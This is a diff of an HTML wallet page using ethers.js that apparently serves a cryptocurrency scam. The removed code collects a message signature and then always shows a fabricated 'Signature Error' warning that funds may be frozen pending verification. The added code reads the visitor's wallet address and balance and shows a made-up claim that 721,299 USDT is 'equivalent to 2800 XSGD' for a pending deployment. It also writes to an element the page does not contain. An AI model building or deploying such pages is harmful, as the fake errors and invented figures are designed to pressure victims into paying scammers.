@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Deployment & Sign with Error</title>
+<title>Wallet Connect & Deployment Info</title>
 
 <style>
 body {
@@ -54,10 +54,9 @@ button:hover:not(:disabled) {
 <body>
 
 <div class="card">
-    <h2>Deployment Completed</h2>
-    <p>Deployment is done successfully.</p>
-    <button id="signBtn">Get Signature</button>
-    <div id="signatureStatus" style="margin-top:15px; color: green;"></div>
+    <h2>Connect Wallet</h2>
+    <button id="connectBtn">Connect Wallet</button>
+    <div id="status" style="margin-top:15px;"></div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
@@ -65,10 +64,10 @@ button:hover:not(:disabled) {
 let provider;
 let signer;
 
-const signBtn = document.getElementById('signBtn');
-const signatureStatus = document.getElementById('signatureStatus');
+const statusEl = document.getElementById('status');
+const connectBtn = document.getElementById('connectBtn');
 
-async function signMessage() {
+async function connectWallet() {
     if (!window.ethereum) {
         alert("Please install MetaMask or another Ethereum wallet extension.");
         return;
@@ -78,33 +77,30 @@ async function signMessage() {
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
 
-        const message = `
-This is a demonstration message for signing.
+        const currentAddress = await signer.getAddress();
+        const balanceBN = await provider.getBalance(currentAddress);
+        const balanceETH = ethers.utils.formatEther(balanceBN);
+        const balanceNumber = Number(balanceETH);
 
-Time:
-${new Date().toISOString()}
-
-Note:
-• Deployment is done.
-• Signature will be generated now.
+        statusEl.innerHTML = `
+        <b>Wallet Connected</b><br/>
+        Address: ${currentAddress}<br/>
+        ETH Balance: ${balanceNumber.toFixed(4)} ETH<br/>
+        Waiting for contract deployment of 2800 XSGD...
         `;
 
-        const signature = await signer.signMessage(message);
-
-        // Show signature
-        signatureStatus.innerHTML = `<b>Signature:</b> ${signature}`;
-
-        // Show error after signature
-        alert("Signature Error: The source of funds does not match the designated wallet. Warning: There is a reasonable possibility that the assets may be temporarily frozen until the ownership and source of funds are successfully verified.");
+        // Show deployment info
+        document.getElementById('contractInfo').innerHTML = `
+        For deploying the full amount of 721,299 USDT, it is equivalent to 2800 XSGD.
+        `;
 
     } catch (err) {
         console.error(err);
-        alert("Error during signing.");
+        alert("Error connecting wallet.");
     }
 }
 
-document.getElementById('signBtn').onclick = signMessage;
+document.getElementById('connectBtn').onclick = connectWallet;
 </script>
-
 </body>
 </html>
